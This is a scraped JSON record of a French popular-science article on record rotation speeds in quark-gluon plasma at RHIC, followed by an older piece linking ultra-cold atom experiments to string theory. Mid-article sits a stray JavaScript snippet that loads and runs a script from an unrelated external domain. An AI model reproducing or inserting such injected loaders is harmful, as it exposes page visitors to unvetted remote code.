{"title": "Record de vitesse de rotation dans un liquide avec du quagma", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "08/08/2017", "content": "Le quagma du Big Bang recréé sur Terre avec des collisions d'ions lourds est non seulement le fluide le plus parfait connu au laboratoire mais aussi celui dans lequel les tourbillons sont les plus rapides. On y a mesuré des vitesses de l'ordre de dix mille milliards de milliards de rotations par seconde. Ce qu'il faut retenir Les quarks, qui s'attirent entre eux avec une force augmentant avec la distance, ne sont jamais solitaires. Mais dans un tout petit volume, avec des pressions et des températures très élevées, les quarks des protons, des neutrons et autres hadrons peuvent exister sous forme d'une sorte de gaz appelé quagma, ou plasma de quarks et de gluons. Dans ce quagma, qui se comporte comme un liquide parfait sans viscosité, des physiciens, au laboratoire, ont observé des tourbillons dont les vitesses de rotation dépassent de loin celles mesurées dans tous les les fluides connus à ce jour. Lorsque l' univers  était âgé de moins d'un millionième de seconde et bien après la phase d'inflation qui a dû permettre la création de la  matière  de l'univers, le cosmos observable devait être composé d'une sorte de  plasma  de  quarks  et de  gluons , qui, lorsqu'il s'est refroidi, a donné les  protons  et les  neutrons . Cet état particulier de la matière est désigné sous le nom de QGP (pour  Quark-Gluon Plasma  en anglais) mais aussi sous le terme de  quagma . Les physiciens de l'expérience Star l'explorent depuis presque 20 ans au  Brookhaven National Laboratory , aux États-Unis. Pour cela, ils accélèrent des  ions  lourds, en l'occurrence formés de noyaux d'or, avec le RHIC ( Relativistic Heavy Ion Collider ) et les font ensuite entrer en collision. Les  nucléons  de ces noyaux se vaporisent alors en donnant un quagma dont la température peut être de l'ordre de 4.000 milliards de degrés, c'est-à-dire plus de 250.000 fois la température à l'intérieur du  Soleil . Les propriétés de ce quagma sont précieuses pour les physiciens car elles pourraient être bavardes sur l'histoire du  Big Bang  et de la suite, dont nous faisons partie. Une présentation des recherches sur le quagma avec RHIC. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur \" Sous-titres \" et enfin sur \" Traduire automatiquement \". Choisissez \" Français \". © BrookhavenLab Dix mille milliards de milliards de rotations par seconde dans le quagma Les chercheurs ont eu la surprise, il y a des années, de découvrir que le quagma se comportait comme un  liquide  parfait, sans  viscosité , ce qui fait penser au comportement de l' hélium  liquide près du  zéro absolu . Comme ils l'expliquent dans une nouvelle publication sur  arXiv , ils viennent de démontrer que les échantillons de quagma qu'ils produisent se comportent comme des fluides en rotation mais à des  vitesses  jamais observées encore en laboratoire. Le record était détenu jusque-là par des  tourbillons  dans l'hélium  superfluide  effectuant 10 7  rotations par seconde. Dans le cas présent, la vitesse atteignait par moments 10 22  rotations par seconde.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le fait que le quagma produit soit en rotation n'est pas surprenant car les ions n'entrent en collision frontalement que très rarement, de sorte qu'il existe un  moment cinétique  initial, lequel doit se conserver. L'existence de ce moment pose des contraintes sur les directions dans lesquelles vont se propager ensuite les  hadrons , comme les protons et les pions, qui vont se former telles des  gouttes  de liquide visqueux froid une fois le quagma refroidi par  condensation  et association des quarks. C'est en mesurant les directions de propagations de protons et de pions provenant eux-mêmes de la désintégration des  hypérons , des hadrons lourds produits par le quagma, que les physiciens ont pu remonter à sa vitesse de rotation. Pour en savoir plus Des atomes ultra-froids pour étudier le quagma ultra-chaud... Article de  Laurent Sacco  publié le 22/02/2009 Lors d'un récent colloque de l' American Association for the Advancement of Science  (AAAS), des physiciens de trois branches différentes ont fait le point sur une spectaculaire convergence apparue il y a quelques années entre la  physique  des  atomes  ultra-froids et celle des collisions d'ions lourds, recréant les températures infernales du plasma de quarks du  Big Bang . Le lien commun est la  théorie des cordes ... Tout a commencé par un résultat inattendu concernant le comportement du plasma de quark produit par des collisions de noyaux d'or avec le  Relativisitic Heavy Ion Collider  (RHIC). Dans ces expériences, le résultat des collisions entre ces noyaux accélérés à 99,99 % de la  vitesse de la lumière  est de recréer les conditions de température et de pression qui devaient régner moins d'un millionième de seconde après la naissance de l'Univers observable. À cette époque, une température de 10 12   kelvins  régnait dans un plasma de quarks et de gluons. Aucun hadron, comme le proton ou le  méson  pi, ne pouvait exister. Les calculs indiquaient que ce plasma devait se comporter comme un  gaz parfait  mais, comme souvent, l'Univers allait se révéler plus étrange qu'on ne l'imaginait... Les physiciens durent se rendre à l'évidence, le plasma de quarks-gluons, encore appelé quagma, qu'ils observaient dans les collisions de RHIC se comportait comme un fluide parfait ! La « boule de  feu  » créée entraient alors en expansion à la façon d'un ellipsoïde d'un fluide à la viscosité presque nulle, à la façon de l'hélium superfluide donc. Tout le monde ne fut pas complètement surpris... en particulier certains théoriciens des cordes. En effet, depuis le milieu des années 1990, la seconde révolution des supercordes avait conduit à une  conjecture  extraordinaire dont aucun contre-exemple n'a été trouvé depuis. En 1997, le physicien argentin d'origine italienne  Juan Maldacena , à la suite de ses travaux sur la description de  l'évaporation des trous noirs de Stephen Hawking  à l'aide de la théorie des cordes, en était arrivé à ce  postulat  : les solutions des  équations  de la théorie unifiée de la matière, de la  gravitation  et des autres forces de l'Univers dans un cadre quantique étaient en fait en correspondance avec les solutions d'une classe particulière d'équations, celle des  champs de Yang-Mills  conformes supersymétriques. Cliquer pour agrandir. Gaz d'atomes ultra-froids et plasma de quarks-gluons semblent séparés par de trop grandes différences d'échelles en température, volume et densité pour obéir à des lois identiques. C'est pourtant le cas ! Peter Steinberg,  Brookhaven National Laboratory                               Ce n'est pas ici le lieu de parler de cette correspondance fort complexe mais il suffit de dire que, si elle est exacte, elle établit une sorte de dictionnaire entre deux langages traitant d'objets appartenant à des mondes différents. Ainsi, l'évaporation d'un trou noir dans un  espace-temps  à 10 dimensions avec un rayonnement de  corps noir  se trouve reliée mathématiquement aux phénomènes se déroulant lors de la formation d'un plasma de quarks-gluons. Rapidement en effet, la boule de plasma devient une sorte de boule de mésons pi et de hadrons chauds, s'évaporant selon la même loi du corps noir mais dans un espace-temps à quatre dimensions. À la recherche d'un liquide parfait Or, selon cette conjecture dite aujourd'hui  conjecture de Maldacena , les calculs effectués sur les  trous noirs  étant plus faciles que dans le cas des équations de Yang-Mills de la théorie des quarks et des gluons. Certains théoriciens des cordes en avaient déduit que le quagma devait effectivement se comporter comme un liquide parfait et pas comme un gaz parfait. Mieux, une prédiction précise sur la valeur minimale du rapport viscosité/entropie du fluide était donnée : 1/4 Pi. Les valeurs observées à RHIC semblaient en bon accord avec cette prédiction mais, en raison de la difficulté de la mesure, certains restaient dubitatifs. Remarquablement, il existe un système physique qui doit lui aussi se comporter comme un liquide presque parfait et conduire à l'analogue de l'expérience de RHIC. Il s'agit d'un gaz d'atomes de  lithium  ultra-froids piégés à l'aide de  lasers . À l'université de Duke, le physicien  John Thomas  et ses collègues se sont alors lancé dans l'aventure et ont réalisé l'expérience. On commence par refroidir à l'intérieur d'un piège optique ces atomes qui forment alors des paires de Cooper, comme les  électrons  dans un  supraconducteur . Plongées dans un  champ magnétique  adéquat, les interactions entre les paires d'atomes disparaissent à l'exception d'effets quantiques et le tout se comporte comme un fluide quantique parfait. Si l'on coupe les lasers, les atomes de lithium confinés en boule entrent en expansion à la façon du quagma dans les expériences de RHIC. La boule prend rapidement la forme d'un ellipsoïde (comme on peut le voir sur le schéma ci-dessous à gauche) et on peut en déduire le fameux rapport viscosité/entropie. Remarquablement, selon la théorie des cordes, des systèmes aussi divers que des trous noirs, des supraconducteurs ou des gaz d'atomes ultra-froids sont décrits par des équations reliées mathématiquement entre elles par les mathématiques de la théorie des cordes. © John Thomas                               Les mesures précises ont vérifié la prédiction de la théorie de cordes ! Il semble bien qu'il y ait là des correspondances profondes entre des théories et des systèmes physiques très différents. D'un côté, la théorie des  interactions fortes  entre quarks, de l'autre la physique de la matière condensé avec des atomes et finalement, faisant un lien mathématique entre eux, la théorie des cordes sous la forme de la conjecture de Maldacena. On reste pantois devant le fait qu'un système refroidi à 10 -7  K puisse renseigner sur ce qui se passe dans un système porté à 10 12  K. Ce dernier étant en effet dix milliards de milliards de fois plus chaud ! S'agit-il d'une preuve de la validité de la théorie des cordes ? La réponse est en fait... non ! Mais cela donne à réfléchir. En effet, il s'agit seulement d'une preuve que la théorie des cordes est bien physiquement et mathématiquement très bien fondée et qu'elle constitue un puissant outil d'analyse mathématique des équations de la  mécanique quantique  décrivant les champs de matière, d'interactions et les systèmes de particules comme des atomes. Mais, pour le moment, cela ne démontre pas que les forces et la matière de l'Univers sont bien unifiées par cette théorie à 11 dimensions d'espace et de temps. De façon analogue, ce n'est pas parce que la théorie mathématique des ondes découverte grâce aux cordes vibrantes et aux  vagues  à la surface l'eau s'applique aussi aux  champs électromagnétiques  ou aux ondes de matière qu'il faut en déduire que l' éther  existe... Mais, incontestablement, elle renforce la conviction du théoricien, la théorie des cordes est bien le meilleur candidat et la meilleure hypothèse de travail dont nous disposons pour unifier les lois de la physique. Cependant, c'est plutôt dans la direction d'expériences et d'observations du genre de celles proposées par  John Ellis  et ses collègues qu'un espoir de preuve de la théorie des cordes doit être recherché. ", "theme": "sciences"}